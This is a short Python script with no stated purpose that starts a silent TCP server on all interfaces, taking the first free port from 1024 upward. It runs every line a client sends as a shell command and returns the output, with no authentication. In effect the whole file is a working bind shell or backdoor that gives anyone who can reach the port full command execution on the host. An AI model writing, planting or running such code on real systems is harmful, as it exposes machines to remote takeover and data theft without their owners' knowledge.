import sys
import socketserver
import threading
import subprocess
from threading import Thread
import json

class TCPHandler(socketserver.StreamRequestHandler):

    def handle(self):
        while True:
            try:
                self.wfile.write("> ".encode('utf-8'))
                data = self.rfile.readline().decode('utf-8').strip()

                self.rfile.flush()

                if data == 'exit':
                    return

                if data != None:
                    output = subprocess.check_output(data, shell=True)
                    self.wfile.write(output)
                    data = None

            except Exception as e:
                self.wfile.write(("Error" + ": " + str(e) + "\n").encode('utf-8'))


class Server():

    def start(self):
        port = 1024
        done = False
        while done == False:
            try:

                server = socketserver.TCPServer(('0.0.0.0', port), TCPHandler)
                # print("Starting server at " + str(port) + "\n")
                t = Thread(target=server.serve_forever)
                t.start()
                done = True
            except Exception as e:
                if e.args[0] == 98:
                    port += 1
                else:
                    print("!- Error at starting TCP thread for port " + str(port) + ", Error: " + str(e))

current_server = Server()
current_server.start()
